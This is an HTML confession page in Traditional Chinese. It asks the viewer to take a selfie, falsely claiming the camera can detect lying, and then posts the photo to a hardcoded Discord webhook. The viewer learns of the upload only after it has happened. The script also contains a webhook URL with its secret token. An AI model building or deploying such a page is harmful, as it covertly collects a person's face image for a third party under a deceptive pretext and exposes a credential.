<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<title>我喜歡妳 💖</title>

<style>
body {
  margin: 0;
  background: #0d1117;
  font-family: "微軟正黑體";
  color: white;
  text-align: center;
  overflow: hidden;
}

.card {
  padding-top: 30px;
}

video {
  width: 90%;
  max-width: 320px;
  border-radius: 12px;
  margin-top: 10px;
}

canvas {
  display: none;
}

button {
  margin: 10px;
  padding: 12px 20px;
  border: none;
  border-radius: 10px;
  font-size: 16px;
  cursor: pointer;
}

#shoot {
  background: #4CAF50;
  color: white;
}

#yesBtn {
  background: #ff4d6d;
  color: white;
}

img {
  width: 200px;
  margin-top: 10px;
  border-radius: 12px;
  display: none;
}
</style>
</head>

<body>

<div class="card">
  <h2>💖 拍一張照片再決定 💖</h2>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <br>

  <button id="shoot">📸 拍照</button>
  <button id="yesBtn">💖 願意</button>

  <br>

  <img id="preview">
</div>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const shoot = document.getElementById("shoot");
const yesBtn = document.getElementById("yesBtn");
const preview = document.getElementById("preview");

let imageData = null;

// 📷 開前置鏡頭（必須用 HTTPS 或 localhost）
navigator.mediaDevices.getUserMedia({
  video: { facingMode: "user" }
}).then(stream => {
  video.srcObject = stream;
}).catch(err => {
  alert("無法開啟相機：" + err);
});

// 📸 拍照
shoot.onclick = () => {
  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0);

  imageData = canvas.toDataURL("image/png");

  preview.src = imageData;
  preview.style.display = "block";
};

// 💖 傳 Discord
yesBtn.onclick = async () => {
  const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";

  if (!imageData) {
    alert("請先開前攝辨識你是否說謊 📸");
    return;
  }

  // 將 base64 轉 blob
  const res = await fetch(imageData);
  const blob = await res.blob();

  const formData = new FormData();
  formData.append("file", blob, "selfie.png");

  const embed = {
    username: "💌 告白系統",
    embeds: [
      {
        title: "💖 告白成功",
        description: "有人按下願意並上傳自拍 ❤️",
        color: 0xff4d6d,
        image: {
          url: "attachment://selfie.png"
        },
        timestamp: new Date().toISOString()
      }
    ]
  };

  formData.append("payload_json", JSON.stringify(embed));

  await fetch(webhookURL, {
    method: "POST",
    body: formData
  });

  alert("已傳送到 Discord 💖");
};
</script>

</body>
</html>
